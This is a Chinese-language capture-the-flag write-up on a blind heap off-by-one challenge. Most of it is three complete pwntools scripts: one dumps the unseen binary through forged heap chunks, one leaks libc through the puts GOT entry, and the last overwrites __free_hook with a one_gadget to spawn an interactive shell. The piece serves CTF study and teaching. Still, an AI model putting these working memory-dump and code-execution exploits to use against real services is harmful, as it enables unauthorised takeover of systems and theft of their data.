# blind-pwn-offbyone

## 题目分析

首先测试程序的基本功能,分析结构,尝试dump内存

首先是要了解过off by one这种漏洞原理,我们发现,读取字符串的函数是scanf

我们要知道scanf的问题是什么?是它会在输入的字符串最后加\x00,所以在这里,我们出现了单字节溢出的问题

> 盲打小贴士:
>
> 为什么读取字符串的函数是scanf,通过,测试,输入特殊符号,不会显示,直接中断,所以是scanf

然后发现输入并没有限制长度...所以这里,可以利用上这种漏洞

利用这个漏洞,泄露出内存

泄露内存的时候,测试是否开启了空间地址随机化,然后发现没有,如果有的话,那就使用mmap申请大内存空间的解法...

泄露出内存,dump出文件

找到一个got表地址,泄露出libc基地址

然后考虑使用one_gadget去覆盖free_hook或者malloc_hook

## dump脚本编写

如果以文件尾作为dump结束的话,在挂载程序的时候可能出现无限泄露,可以考虑加上范围限制,这个要根据具体的情况考虑,这里暂时就无限泄露,ctrl+C断开

通过单字节溢出,以及精心伪造一个堆chunk结构,实现任意地址泄露内存

偏移量这里解释一下,由于一个chunk头部都会有0x10个字节用来存放pre_size和size,所以偏移量是0x1000-0x10

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#context.log_level = 'debug'#critical/debug
p = process("./buy")
f = open("buybin", "ab+")
#f = open("64weiba", "ab+")

def writename(name):
	io.recvuntil("(1~32):")
	io.sendline(name)

def namechange(name):
	io.recvuntil("Your choice:")
	io.sendline("6")
	io.recvuntil("(1~32):")
	io.sendline(name)

def add(name_size,name,des_size,des):
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil(".")
	io.sendline(str(name_size))
	io.recvuntil(".")
	io.sendline(name)
	io.recvuntil(".")
	io.sendline(str(des_size))
	io.recvuntil(".")
	io.sendline(des)

def displayall():
	io.recvuntil("Your choice:")
	io.sendline("3")
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil(32*"a")
	#io.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1
	book1_addr = io.recvuntil("\'s",drop=True)
	book1_addr = book1_addr.ljust(8,'\x00')
	book1_addr = u64(book1_addr)
	#print hex(book1_addr)
	io.recvuntil("des address is ")

	return book1_addr

def change(index,name,desrcript):
	io.recvuntil("Your choice:")
	io.sendline("2")
	io.recvuntil("index is ")
	io.sendline(str(index))
	io.recvuntil("y's name.\n")
	io.sendline(name)
	io.recvuntil("y's desrcription.")
	io.sendline(desrcript)

def displayall_getdump(index):
	io.recvuntil("Your choice:")
	io.sendline("2")
	io.recvuntil("index is ")
	io.sendline(str(index))
	io.recvuntil("name is ")
	addr = io.recvuntil("\n",drop=True)
	#addr = addr.ljust(8,'\x00')
	#addr = u64(addr)
	return addr


begin = 0x400000
offset = 0
i=0

while True:#i<13:#True:#
	addr = begin + offset	
	
	try:
		io = process("./buy")
		#get the first heap address
		writename("a"*32)
		add(4200,"spring",12,"aaa")
		first_heap_addr = displayall()
		print '[*] first_heap_addr is ' + hex(first_heap_addr) 
		#first_heap_addr = 0x605040
		'''
		int name_size;
		char *name;
		int des_size;
		char *desrcript;	
		'''
		#get dump test
		displayall()
		#first heap pre_size size 0x10
		ljust_offset = 4096 - 16
		print '[*] ljust_offset is ' + hex(ljust_offset)
		payload_des_dump = ljust_offset *'c' + p64(12) + p64(addr) + p64(12) + p64(addr)
		#payload_des_dump = 0xfff * 'c'
		#pause()
		change(0,"spring",payload_des_dump)
		namechange("a"*32)
		#gdb.attach(io)
		info = displayall_getdump(0)
		print '[*] info is ' + info
		io.close()

	except EOFError:
		print "offset is " + hex(offset)
		break
	if len(info)==0:
		print "info is null"
		offset += 1
		f.write('\x00')
	else:
		info += "\x00"
		offset += len(info)
		f.write(info)
		f.flush()
	i = i + 1
	print "offset is " + str(offset)
f.close()
p.close()
#'''
```

dump出来的程序,需要找到一个函数的got表地址就行了,这样就可以计算出对应的一个偏移

泄露出来的文件还是不可以被反汇编,但是可以找到很多汇编代码

然后通过去寻找一个函数的plt地址,最好是找puts或者printf,因为题目显示字符串一直在用这两个函数,所以这两个函数使用次数最多,所以肯定比较好分辨

找到puts_got

## 泄露libc

其实和之前的代码一样,主要的任务就是,但是地址覆盖写在puts_got的地址

```python
#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
elfFileName = "buy"
libcFileName = ""
ip = ""
port = 0

Debug = 1
if Debug:
    io = process(elfFileName)
else:
    io = remote(ip,port)
#elf = ELF(elfFileName)
def writename(name):
	io.recvuntil("(1~32):")
	io.sendline(name)

def namechange(name):
	io.recvuntil("Your choice:")
	io.sendline("6")
	io.recvuntil("(1~32):")
	io.sendline(name)

def add(name_size,name,des_size,des):
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil(".")
	io.sendline(str(name_size))
	io.recvuntil(".")
	io.sendline(name)
	io.recvuntil(".")
	io.sendline(str(des_size))
	io.recvuntil(".")
	io.sendline(des)

def displayall():
	io.recvuntil("Your choice:")
	io.sendline("3")
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil(32*"a")
	#io.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1
	book1_addr = io.recvuntil("\'s",drop=True)
	book1_addr = book1_addr.ljust(8,'\x00')
	book1_addr = u64(book1_addr)
	#print hex(book1_addr)
	#io.recvuntil("des address is ")

	return book1_addr

def change(index,name,desrcript):
	io.recvuntil("Your choice:")
	io.sendline("2")
	io.recvuntil("index is ")
	io.sendline(str(index))
	io.recvuntil("y's name.\n")
	io.sendline(name)
	io.recvuntil("y's desrcription.")
	io.sendline(desrcript)

def displayall_getdump():
	io.recvuntil("Your choice:")
	io.sendline("3")
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil("name is ")
	addr = io.recvuntil("\n",drop=True)
	addr = addr.ljust(8,'\x00')
	addr = u64(addr)
	#io.recvuntil("des address is ")
	return addr

def make_empty(index):
	io.recvuntil("Your choice:")
	io.sendline("5")
	io.recvuntil("Your choice:")
	io.sendline("2")
	io.recvuntil("The index is ")
	io.sendline(str(index))


#get the first heap address
writename("a"*32)
add(4200,"spring",12,"aaa")
add(16,"hello",16,"hello")
first_heap_addr = displayall()
print '[*] first_heap_addr is ' + hex(first_heap_addr) 
#first_heap_addr = 0x605040
'''
int name_size;
char *name;
int des_size;
char *desrcript;	
'''
#get dump test
displayall()
#first heap pre_size size 0x10
offset = 4096 - 16
print '[*] offset is ' + hex(offset)

puts_got = 0x603028
printf_got = 0x603040


payload_got_get = offset *'c' + p64(20) + p64(puts_got) + p64(20) + p64(first_heap_addr+0x78)
#payload_des_dump = 0xfff * 'c'
#pause()
change(0,"spring",payload_got_get)
namechange("a"*32)
#gdb.attach(io)
puts_addr = displayall_getdump()
print '[*] puts_addr is ' + hex(puts_addr)

#find libc
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
freehook_addr = libc_base + libc.dump('__free_hook')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
print '[*] freehook_addr is ' + hex(freehook_addr)
print '[*] system_addr is ' + hex(system_addr)
print '[*] binsh_addr is ' + hex(binsh_addr)

one_gadget = libc_base + 0x4526a
print '[*] one_gadget is ' + hex(one_gadget)

change(0,p64(puts_addr),p64(freehook_addr))
change(1,p64(system_addr),p64(system_addr))

make_empty(1)

io.interactive()
```

那么这里,其实我已经给出是错误的exp,但是在测试过程中,可以把one_gadget改成system_addr,这样子,只要能够出现sh报错,就能知道可以选择哪个libc库

我这里是```[+] ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) be choosed.```

## 获取one_gadget

### 安装one_gadget

```bash
su root
apt-get install ruby
apt-get install gem
gem install one_gadget
```

### 获取libc库的onegadget

找到libcsearch的安装文件夹,找到对应id的libc库

然后执行,命令

```bash
one_gadget libc6_2.23-0ubuntu10_amd64.so
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

上面4个,第二个成功了...

## exp

```python
#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
elfFileName = "buy"
libcFileName = ""
ip = ""
port = 0

Debug = 1
if Debug:
    io = process(elfFileName)
else:
    io = remote(ip,port)
#elf = ELF(elfFileName)
def writename(name):
	io.recvuntil("(1~32):")
	io.sendline(name)

def namechange(name):
	io.recvuntil("Your choice:")
	io.sendline("6")
	io.recvuntil("(1~32):")
	io.sendline(name)

def add(name_size,name,des_size,des):
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil(".")
	io.sendline(str(name_size))
	io.recvuntil(".")
	io.sendline(name)
	io.recvuntil(".")
	io.sendline(str(des_size))
	io.recvuntil(".")
	io.sendline(des)

def displayall():
	io.recvuntil("Your choice:")
	io.sendline("3")
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil(32*"a")
	#io.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1
	book1_addr = io.recvuntil("\'s",drop=True)
	book1_addr = book1_addr.ljust(8,'\x00')
	book1_addr = u64(book1_addr)
	#print hex(book1_addr)
	#io.recvuntil("des address is ")

	return book1_addr

def change(index,name,desrcript):
	io.recvuntil("Your choice:")
	io.sendline("2")
	io.recvuntil("index is ")
	io.sendline(str(index))
	io.recvuntil("y's name.\n")
	io.sendline(name)
	io.recvuntil("y's desrcription.")
	io.sendline(desrcript)

def displayall_getdump():
	io.recvuntil("Your choice:")
	io.sendline("3")
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil("name is ")
	addr = io.recvuntil("\n",drop=True)
	addr = addr.ljust(8,'\x00')
	addr = u64(addr)
	#io.recvuntil("des address is ")
	return addr

def make_empty(index):
	io.recvuntil("Your choice:")
	io.sendline("5")
	io.recvuntil("Your choice:")
	io.sendline("2")
	io.recvuntil("The index is ")
	io.sendline(str(index))


#get the first heap address
writename("a"*32)
add(4200,"spring",12,"aaa")
add(16,"hello",16,"hello")
first_heap_addr = displayall()
print '[*] first_heap_addr is ' + hex(first_heap_addr) 
#first_heap_addr = 0x605040
'''
int name_size;
char *name;
int des_size;
char *desrcript;	
'''
#get dump test
displayall()
#first heap pre_size size 0x10
offset = 4096 - 16
print '[*] offset is ' + hex(offset)

puts_got = 0x603028
printf_got = 0x603040


payload_got_get = offset *'c' + p64(20) + p64(puts_got) + p64(20) + p64(first_heap_addr+0x78)
#payload_des_dump = 0xfff * 'c'
#pause()
change(0,"spring",payload_got_get)
namechange("a"*32)
#gdb.attach(io)
puts_addr = displayall_getdump()
print '[*] puts_addr is ' + hex(puts_addr)

#find libc
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
freehook_addr = libc_base + libc.dump('__free_hook')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
print '[*] freehook_addr is ' + hex(freehook_addr)
print '[*] system_addr is ' + hex(system_addr)
print '[*] binsh_addr is ' + hex(binsh_addr)
''' onegadget
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = libc_base + 0x4526a
print '[*] one_gadget is ' + hex(one_gadget)

change(0,p64(puts_addr),p64(freehook_addr))
change(1,p64(one_gadget),p64(system_addr))

make_empty(1)

io.interactive()

```

## 总结

blind pwn的核心是实现泄露内存,从而dump出整个文件

而漏洞可利用在blind pwn上的条件为:

- brop: 必须的地址复用,栈区溢出,read函数
- fmt: 格式化字符串漏洞,read函数
- offbyone: 堆区可控大小,单字节溢出,read函数,变量的结构(结构体和全局变量)

这可以作为一个系列,很开心,能够搞出这些东西,以后会加上空间地址随机化,应该会更加有意思